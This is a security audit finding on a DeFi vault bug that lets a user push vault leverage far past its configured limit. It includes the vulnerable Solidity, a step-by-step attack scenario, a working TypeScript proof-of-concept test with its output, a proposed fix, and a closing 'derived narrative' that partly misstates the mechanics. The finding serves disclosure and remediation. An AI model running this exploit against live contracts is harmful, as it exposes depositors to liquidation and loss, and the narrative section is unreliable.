---
id: 20386
severity: "High"
---

# Vault leverage can be increased to any value

## Description

When redeeming from the vault, maximum amount allowed to be redeemed is limited by collateral required to keep the minimum vault position size which will remain open due to different factors, including closable value, which is a limitation on how much position can be closed given current pending positions. However, when calculating max redeemable amount, closable value is multiplied by StrategyLib.LEVERAGE_BUFFER value (currently 1.2):
```solidity
.sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))
// available maker
.min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))
// available closable
.muldiv(marketContext.latestPrice.abs(), registration.leverage)
// available collateral
.muldiv(totalWeight, registration.weight);
// collateral in market
```
The intention seems to be to allow to withdraw a bit more collateral so that leverage can increase at max by LEVERAGE_BUFFER. However, the math is totally wrong here, for example:
- Current position = 12, closable = 10
- Max amount allowed to be redeemed is 12 (100% of shares)
- However, when all shares are withdrawn, closable = 10 prevents full position closure, so position will remain at 12-10 = 2
- Once settled, user can claim all vault collateral while vault still has position of size 2 open. Claiming all collateral will revert due to this line in allocate:
```solidity
_locals.marketCollateral = strategy.marketContexts[marketId].margin
    .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight));
```
So the user can claim the assets only if remaining collateral is equal to or is greater than total margin of all markets. This means that user can put the vault into max leverage possible ignoring the vault leverage config (vault will have open position of such size, which will make all vault collateral equal the minimum margin requirement to open such position). This creates a big risk for vault liquidation and loss of funds for vault depositors. As seen from the example above, it's possible to put the vault at high leverage only if user redeems amount higher than closable allows (redeem amount in the closable..closable * LEVERAGE_BUFFER range). However, since deposits and redeems from the vault are settled later, it's impossible to directly create such situation (redeemable amount > closable). There is still a way to create such situation indirectly via maker limit limitation.

Scenario:
1. Market config leverage = 4. Existing deposits = $1K. Existing positions in underlying market are worth $4K
2. Open maker position in underlying markets such that makerLimit - currentMaker = $36K
3. Deposit $11K to the vault (total deposits = $12K). The vault will try to open position of size = 48K(+44K), however makerLimit will not allow to open full position, so the vault will only open +$36K (total position $40K)
4. Wait until the deposit settles
5. Close maker position in underlying markets to free up maker limit
6. Deposit minimum amount to the vault from another user. This increases vault positions to $48K (settled = $40K, pending = $48K, closable = $40K)
7. Redeem 11K from the vault: This is possible because maxRedeem is `closable * LEVERAGE_BUFFER / leverage` = `40K / 4 * 1.2 = $12K`. However, the position will be limited by closable, so it will be reduced only by $40K (set to $8K).
8. Wait until redeem settles
9. Claim $11K from the vault. This leaves the vault with the latest position = $8K, but only with $1K of original deposit, meaning vault leverage is now 8 - twice the value specified by config (4).

This scenario will keep high vault leverage only for a short time until next oracle version, because claim will reduce position back to $4K, however this position reduction can also be avoided, for example, by opening/closing positions to make long-short = maker or short-long = maker in the underlying market(s), thus disallowing the vault to reduce its maker position and keeping the high leverage. Malicious user can put the vault at very high leverage, breaking important protocol invariant (leverage not exceeding target market leverage) and exposing the users to much higher potential funds loss / risk from the price movement due to high leverage and very high risk of vault liquidation, causing additional loss of funds from liquidation penalties and position re-opening fees.

## Proof of Concept

The scenario above is demonstrated in the test, add this to Vault.test.ts:
```typescript
it('increase vault leverage', async () => {
    console.log("start");
    async function setOracle(latestTime: BigNumber, currentTime: BigNumber) {
        await setOracleEth(latestTime, currentTime)
        await setOracleBtc(latestTime, currentTime)
    }
    async function setOracleEth(latestTime: BigNumber, currentTime: BigNumber) {
        const [, currentPrice] = await oracle.latest()
        const newVersion = {
            timestamp: latestTime,
            price: currentPrice,
            valid: true,
        }
        oracle.status.returns([newVersion, currentTime])
        oracle.request.whenCalledWith(user.address).returns()
        oracle.latest.returns(newVersion)
        oracle.current.returns(currentTime)
        oracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)
    }
    async function setOracleBtc(latestTime: BigNumber, currentTime: BigNumber) {
        const [, currentPrice] = await btcOracle.latest()
        const newVersion = {
            timestamp: latestTime,
            price: currentPrice,
            valid: true,
        }
        btcOracle.status.returns([newVersion, currentTime])
        btcOracle.request.whenCalledWith(user.address).returns()
        btcOracle.latest.returns(newVersion)
        btcOracle.current.returns(currentTime)
        btcOracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)
    }
    async function logLeverage() {
        // vault collateral
        var vaultCollateralEth = (await market.locals(vault.address)).collateral
        var vaultCollateralBtc = (await btcMarket.locals(vault.address)).collateral
        var vaultCollateral = vaultCollateralEth.add(vaultCollateralBtc)
        // vault position
        var vaultPosEth = (await market.positions(vault.address)).maker;
        var ethPrice = (await oracle.latest()).price;
        var vaultPosEthUsd = vaultPosEth.mul(ethPrice);
        var vaultPosBtc = (await btcMarket.positions(vault.address)).maker;
        var btcPrice = (await btcOracle.latest()).price;
        var vaultPosBtcUsd = vaultPosBtc.mul(btcPrice);
        var vaultPos = vaultPosEthUsd.add(vaultPosBtcUsd);
        var leverage = vaultPos.div(vaultCollateral);
        console.log("Vault collateral = " + vaultCollateral.div(1e6) + " pos = " + vaultPos.div(1e12) + " leverage = " + leverage);
    }
    await setOracle(STARTING_TIMESTAMP.add(3600), STARTING_TIMESTAMP.add(3700))
    await vault.settle(user.address);
    // put markets at the (limit - 5000) each
    var makerLimit = (await market.riskParameter()).makerLimit;
    var makerCurrent = (await market.position()).maker;
    var maker = makerLimit;
    var ethPrice = (await oracle.latest()).price;
    var availUsd = parse6decimal('32000'); // 10/2 * 4
    var availToken = availUsd.mul(1e6).div(ethPrice);
    maker = maker.sub(availToken);
    var makerBefore = makerCurrent;
    console.log("ETH Limit = " + makerLimit + " CurrentGlobal = " + makerCurrent + " CurrentUser = " + makerBefore + " price = " + ethPrice + " availToken = " + availToken + " maker = " + maker);
    for (var i = 0; i < 5; i++)
        await fundWallet(asset, user);
    await market.connect(user).update(user.address, maker, 0, 0, parse6decimal('1000000'), false)
    var makerLimit = (await btcMarket.riskParameter()).makerLimit;
    var makerCurrent = (await btcMarket.position()).maker;
    var maker = makerLimit;
    var btcPrice = (await btcOracle.latest()).price;
    var availUsd = parse6decimal('8000'); // 10/2 * 4
    var availToken = availUsd.mul(1e6).div(btcPrice);
    maker = maker.sub(availToken);
    var makerBeforeBtc = makerCurrent;
    console.log("BTC Limit = " + makerLimit + " CurrentGlobal = " + makerCurrent + " CurrentUser = " + makerBeforeBtc + " price = " + btcPrice + " availToken = " + availToken + " maker = " + maker);
    for (var i = 0; i < 10; i++)
        await fundWallet(asset, btcUser1);
    await btcMarket.connect(btcUser1).update(btcUser1.address, maker, 0, 0, parse6decimal('2000000'), false)
    console.log("market updated");
    var deposit = parse6decimal('12000')
    await vault.connect(user).update(user.address, deposit, 0, 0)
    await setOracle(STARTING_TIMESTAMP.add(3700), STARTING_TIMESTAMP.add(3800))
    await vault.settle(user.address)
    await logLeverage();
    // withdraw the blocking amount
    console.log("reduce maker blocking position to allow vault maker increase")
    await market.connect(user).update(user.address, makerBefore, 0, 0, 0, false);
    await btcMarket.connect(btcUser1).update(btcUser1.address, makerBeforeBtc, 0, 0, 0, false);
    await setOracle(STARTING_TIMESTAMP.add(3800), STARTING_TIMESTAMP.add(3900))
    // refresh vault to increase position size since it's not held now
    var deposit = parse6decimal('10')
    console.log("Deposit small amount to increase position")
    await vault.connect(user2).update(user2.address, deposit, 0, 0)
    // now redeem 11000 (which is allowed, but market position will be 2000 due to closable)
    var redeem = parse6decimal('11500')
    console.log("Redeeming 11500")
    await vault.connect(user).update(user.address, 0, redeem, 0);
    // settle all changes
    await setOracle(STARTING_TIMESTAMP.add(3900), STARTING_TIMESTAMP.add(4000))
    await vault.settle(user.address)
    await logLeverage();
    // claim those assets we've withdrawn
    var claim = parse6decimal('11100')
    console.log("Claiming 11100")
    await vault.connect(user).update(user.address, 0, 0, claim);
    await logLeverage();
})
```
Console log from execution of the code above:
start
ETH Limit = 1000000000 CurrentGlobal = 200000000 CurrentUser = 200000000 price = 2620237388 availToken = 12212633 maker = 987787367
BTC Limit = 100000000 CurrentGlobal = 20000000 CurrentUser = 20000000 price = 38838362695 availToken = 205981 maker = 99794019
market updated
Vault collateral = 12000 pos = 39999 leverage = 3333330
reduce maker blocking position to allow vault maker increase
Deposit small amount to increase position
Redeeming 11500
Vault collateral = 12010 pos = 8040 leverage = 669444
Claiming 11100
Vault collateral = 910 pos = 8040 leverage = 8835153

## Recommendation

Delta position size (maxRedeem returns delta to subtract from current position). Currently redeem amount is limited by: closable * LEVERAGE_BUFFER. Once subtracted from the current position size, we obtain:
- maxRedeem = closable * LEVERAGE_BUFFER / leverage
- newPosition = currentPosition - closable
- newCollateral = (currentPosition - closable * LEVERAGE_BUFFER) / leverage
- newLeverage = newPosition / newCollateral = leverage * (currentPosition - closable) / (currentPosition - closable * LEVERAGE_BUFFER)
- = leverage / (1 - (LEVERAGE_BUFFER - 1) * closable / (currentPosition - closable))

As can be seen, the new leverage can be any amount and the formula doesn't make much sense, it certainly doesn't limit new leverage factor to LEVERAGE_BUFFER (denominator can be 0, negative or any small value, meaning leverage can be any number as high as you want). I think what developers wanted is to have:
- newPosition = currentPosition - closable
- newCollateral = newPosition / (leverage * LEVERAGE_BUFFER)
- newLeverage = newPosition / (newPosition / (leverage * LEVERAGE_BUFFER)) = leverage * LEVERAGE_BUFFER

Now, the important part to understand is that it's impossible to calculate delta collateral simply from delta position like it is now. When we know target newPosition, we can calculate target newCollateral, and then maxRedeem (delta collateral) can be calculated as currentCollateral - newCollateral:
- maxRedeem = currentCollateral - newCollateral
- maxRedeem = currentCollateral - newPosition / (leverage * LEVERAGE_BUFFER)
```solidity
.sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))
// available maker
.min(marketContext.closable)
// available closable
.muldiv(marketContext.latestPrice.abs(), registration.leverage.mul(StrategyLib.LEVERAGE_BUFFER))
// allow leverage to be higher by LEVERAGE_BUFFER
// delta collateral
.muldiv(totalWeight, registration.weight);
// market collateral => vault collateral
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from an incorrect calculation of the maximum amount that can be redeemed from a vault. When a user requests a redemption, the contract determines the limit by taking the amount of collateral that is currently closable and multiplying it by a constant called LEVERAGE_BUFFER (currently set to 1.2). The intention is to allow a small safety margin so that the vault’s leverage can increase at most by the buffer factor. However, the formula also applies the buffer to the position size before the actual reduction of the vault’s position is performed, which results in a delta‑collateral value that does not correspond to the intended new leverage. Consequently, a user can redeem an amount that is larger than the true closable amount, leaving the vault with a residual position that is much smaller than the remaining collateral. This mismatch lets the vault’s effective leverage grow far beyond the market‑configured leverage limit. In practice, an attacker can follow a multi‑step scenario: deposit a large amount, trigger a partial position opening limited by the underlying maker limit, wait for settlement, free up maker capacity, make a small additional deposit, and then redeem an amount that is allowed by the buffered formula but exceeds the actual closable value. After settlement the vault ends up with a position that is only a fraction of the original deposit, while the collateral reported to the user is close to the original deposit, effectively doubling (or more) the leverage. From the user’s perspective the UI will show a normal redemption amount, but the vault’s leverage metric spikes dramatically, and subsequent claim transactions may revert because the remaining collateral is insufficient to cover the required margin. The bug breaks the core business invariant that a vault’s leverage never exceeds the target market leverage, exposing all depositors to a heightened risk of liquidation, liquidation penalties, and loss of funds. The issue was discovered during a manual audit that examined the redeem‑logic and identified that the LEVERAGE_BUFFER was applied to the wrong term, leading to a mathematically unsound delta‑collateral computation. It is hard to notice because the contract still respects the closable limit in most ordinary flows, and the buffer value is small, so only carefully crafted sequences expose the flaw. The proper fix is to compute the maximum redeemable collateral based on the target new position size, then derive the required new collateral using the configured leverage multiplied by the buffer, and finally limit the redeemable amount to the difference between current collateral and this new collateral. In other words, the buffer should be applied to the leverage factor, not to the closable amount, ensuring that the resulting leverage after redemption cannot exceed leverage × LEVERAGE_BUFFER. This class of bug belongs to the broader category of incorrect financial invariant enforcement caused by misapplied scaling factors in margin‑or‑leverage calculations.
